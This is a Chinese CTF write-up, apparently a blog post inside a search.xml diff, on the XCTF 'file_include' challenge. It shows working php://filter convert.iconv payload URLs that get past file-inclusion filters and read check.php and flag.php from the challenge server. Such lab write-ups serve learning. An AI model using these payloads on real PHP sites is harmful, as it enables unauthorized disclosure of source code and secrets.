+<p>file_include：<a href="https://adworld.xctf.org.cn/challenges/details?hash=ceb014e8-3a5a-11ed-abf3-fa163e4fa609&amp;task_category_id=3">https://adworld.xctf.org.cn/challenges/details?hash=ceb014e8-3a5a-11ed-abf3-fa163e4fa609&amp;task_category_id=3</a></p>
+<p>解题参考：<a href="https://blog.csdn.net/shelter1234567/article/details/127393549">江苏工匠杯_file _include_wp_昵称还在想呢的博客-CSDN博客</a></p>
+<p>文件包含的绕过或许也可以尝试一下过滤器绕过的思路</p>
+<p>在这题ctf例题中就是采用的过滤器绕过思路中的</p>
+<p>0x02 Conversion Filters（转换过滤器）</p>
+<p>转换过滤器里的convert.iconv.*</p>
+<p>这个过滤器需要 php 支持 iconv，而 iconv 是默认编译的（、iconv不是php的默认函数，也是默认安装的模块。需要安装才能用的。）。使用convert.iconv.*过滤器等同于用<code>iconv()</code>函数处理所有的流数据。</p>
+<p>使用方法：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">convert.iconv.&lt;input-encoding&gt;.&lt;output-encoding&gt; </span><br><span class="line">or </span><br><span class="line">convert.iconv.&lt;input-encoding&gt;/&lt;output-encoding&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>&lt;input-encoding&gt;和&lt;output-encoding&gt;</code> 就是编码方式，有如下几种;</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UCS-4*</span><br><span class="line">UCS-4BE</span><br><span class="line">UCS-4LE*</span><br><span class="line">UCS-2</span><br><span class="line">UCS-2BE</span><br><span class="line">UCS-2LE</span><br><span class="line">UTF-32*</span><br><span class="line">UTF-32BE*</span><br><span class="line">UTF-32LE*</span><br><span class="line">UTF-16*</span><br><span class="line">UTF-16BE*</span><br><span class="line">UTF-16LE*</span><br><span class="line">UTF-7</span><br><span class="line">UTF7-IMAP</span><br><span class="line">UTF-8*</span><br><span class="line">ASCII*</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>利用姿势：把flag.php的内容从<code>UCS-2LE</code>编码转换为<code>UCS-2BE</code>编码</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=2.php</span><br></pre></td></tr></table></figure>
+
+<p>在本例题中</p>
+<p>知道绕过方式后我们回显check.php里面的源码:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://61.147.171.105:61806/?filename=php://filter/convert.iconv.UTF-7.UCS-2LE/resource=check.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221025114012.png"></p>
+<p>如图,本题对过滤器进行了限制,还限制了convert.iconv.*过滤器里的编码类型.但好在该过滤器支持的编码类型多样,所以换种编码类型也能达到绕过效果,(多试几种编码类型)</p>
+<p>本题通关poc</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://61.147.171.105:61806/?filename=php://filter/convert.iconv.UTF-7.UCS-2LE/resource=flag.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221025114526.png"></p>
+<p>这还有一题也是ctf里面的文件包含形式，这题的过滤代码更多</p>
+<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221025155125.png"></p>
+<p>也是使用这个过滤器问题，多试几次过滤器里面的编码形式就可以得出答案了。</p>
+<p>所以文件包含的绕过思路绝不止一种,多试试.</p>
+]]></content>
+      <categories>
+        <category>基础知识</category>
+      </categories>
+      <tags>
+        <tag>基础知识</tag>
       </tags>
   </entry>
 </search>
